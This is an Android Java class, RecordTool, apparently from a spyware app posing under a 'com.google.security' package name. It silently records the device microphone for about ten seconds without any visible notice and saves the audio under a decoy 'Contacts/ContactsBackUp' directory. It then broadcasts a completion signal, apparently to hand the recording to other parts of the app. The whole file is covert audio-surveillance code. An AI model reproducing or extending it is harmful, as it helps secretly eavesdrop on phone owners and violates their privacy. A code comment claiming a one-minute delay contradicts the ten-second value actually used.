package com.google.security.tools;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;

import com.google.security.FinishReceiver;
import com.google.security.MainService;

public class RecordTool {

	private static RecordTool recordTool;
	private Context context;
	private MediaRecorder mediaRecorder = null;
	private boolean sdcardExists = false;
	private File recordAudioSaveFileDir = null;// 保存音频文件的文件夹
	private File recordAudioSaveFile = null;
	private String recordAudioSaveFileName = null;// 文件的名称
	private String recDir = "Contacts/ContactsBackUp/m";// 保存的目录名称
	private boolean isRecord = false; // 录音的标志
	Timer timer;

	public RecordTool(Context context) {
		this.context = context;
	}

	public static RecordTool getIntance(Context context) {
		if (recordTool == null)
			return new RecordTool(context);
		return recordTool;
	}

	public void start() {
		if ((this.sdcardExists = Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED))) {// 判断sd卡是否存在
			this.recordAudioSaveFileDir = new File(
					MainService.RECORD_FORDER_PATH);
			if (!this.recordAudioSaveFileDir.exists()) {// 文件夹不存在
				this.recordAudioSaveFileDir.mkdirs();// 创建文件夹
			}
			this.recordAudioSaveFileName = this.recordAudioSaveFileDir
					.toString()
					+ File.separator
					+ System.currentTimeMillis()
					/ 1000 + ".mp3";// 录音文件名称
			this.recordAudioSaveFile = new File(this.recordAudioSaveFileName);
			this.mediaRecorder = new MediaRecorder();
			this.mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // 音频来源是MIC
			this.mediaRecorder
					.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			this.mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
			this.mediaRecorder.setOutputFile(this.recordAudioSaveFileName);// 输出到文件夹
			try {
				this.mediaRecorder.prepare();// 准备录音
			} catch (Exception e) {
			}
			this.mediaRecorder.start(); // 开始录音
			this.isRecord = true; // 正在录音
			// Toast.makeText(context, "开始", Toast.LENGTH_SHORT).show();

			timer = new Timer();
			TimerTask ts = new TimerTask() {

				@Override
				public void run() {
					stop();
					while (true) {
						File file = new File(MainService.RECORD_FORDER_PATH);
						if (file.list().length != 0) {
							FinishReceiver.finishbroadcast("record", context);
							break;
						}
					}

				}
			};
			timer.schedule(ts, 1000 * 10);// 延迟1分钟后停止录音
		}

	}

	public void stop() {// 停止录音函数
		if (this.isRecord) { // 正在录音
			// Toast.makeText(context, "结束", Toast.LENGTH_SHORT).show();
			this.mediaRecorder.stop(); // 停止
			this.mediaRecorder.release(); // 释放资源
		}
	}
}
